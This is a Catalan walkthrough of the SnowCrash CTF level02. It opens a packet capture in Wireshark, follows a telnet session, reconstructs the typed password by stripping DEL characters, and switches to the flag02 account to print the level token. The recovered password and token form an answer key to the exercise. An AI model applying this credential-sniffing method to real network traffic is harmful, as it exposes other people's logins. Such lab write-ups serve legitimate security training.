# TL;DR / TLTR
##### Llistar fitxers i directoris visibles i ocults:
```bash
level02@SnowCrash:~$ ls -la
total 24
dr-x------ 1 level02 level02  120 Mar  5  2016 .
d--x--x--x 1 root    users    340 Aug 30  2015 ..
-r-x------ 1 level02 level02  220 Apr  3  2012 .bash_logout
-r-x------ 1 level02 level02 3518 Aug 30  2015 .bashrc
-r-x------ 1 level02 level02  675 Apr  3  2012 .profile
----r--r-- 1 flag02  level02 8302 Aug 30  2015 level02.pcap
level02@SnowCrash:~$ 
```
##### Observem fitxer sospitós amb format ".pcap":
```bash
----r--r-- 1 flag02  level02 8302 Aug 30  2015 level02.pcap
```
```text
.pcap -> Es tracta d'un format de captura de trànsit de xarxa (packet capture)
```
```bash
##### Passem l'arxiu al host per poder analitzar-l'ho de manera més acurada amb les eïnes que ens poguem descarregar:
```bash
level02@SnowCrash:~$ cat level02.pcap | ssh hostUser@192.168.1.19 "cat > /home/hostUser/Documents/42outerCore/snow_crash/snow_crash/level02/resources/packetCapture.pcap"
Could not create directory '/home/user/level02/.ssh'.
The authenticity of host '192.168.1.19 (192.168.1.19)' can't be established.
ECDSA key fingerprint is e2:f0:85:bc:8c:d1:aa:83:cc:f7:be:05:84:4b:b0:ae.
Are you sure you want to continue connecting (yes/no)? yes
Failed to add the host to the list of known hosts (/home/user/level02/.ssh/known_hosts).
hostUser@192.168.1.19's password: myHostPassword
```
###### Farem servir wireshark per la lectura del fitxer .pcap
```bash
sudo apt install wireshark
sudo usermod -aG wireshark $USER
wireshark
```
```text
Un cop obert el programa Wireshark
Open file .pcap que hem guardat en el host -> (packetCapture.pcap)
En la barra/camp filter escrivim "tcp" o "tcp 12121" -> 12121 port servidor(fixa) i 39247 és port client(random canvia)
Fem clic dret sobre alguna de les línies tcp i premem "Follow" seguit de "TCP Stream" o directament amb el shortcut (Ctrl+Alt+Maj+T)
S'obra una finestra amb el resultat següent on podrem veure pràcticament la contrasenya:

..%..%..&..... ..#..'..$..&..... ..#..'..$.. .....#.....'........... .38400,38400....#.SodaCan:0....'..DISPLAY.SodaCan:0......xterm.........."........!........"..".....b........b....	B.
..............................1.......!.."......"......!..........."........"..".............	..
.....................
Linux 2.6.38-8-generic-pae (::ffff:10.1.1.2) (pts/10)

..wwwbugs login: l.le.ev.ve.el.lX.X
..
Password: ft_wandr...NDRel.L0L
.
..
Login incorrect
wwwbugs login: 
```
###### Eus aquí un gran descobriment:
```text
El password és ft_wandr...NDRel.L0L, però esborrem els caràcters que precedeixen '.': => ft_waNDReL0L. Doncs els punts representen el codi 0x7f o DEL els non-printable "delete". Eliminant el caràcter immediatatament anterior (backspace)
```
##### Provem a veure si és el password de la flag
```bash
level02@SnowCrash:~$ su flag02
Password: ft_waNDReL0L
Don't forget to launch getflag !
flag02@SnowCrash:~$ getflag
Check flag.Here is your token : kooda2puivaav1idi4f57q8iq
flag02@SnowCrash:~$ 
```
```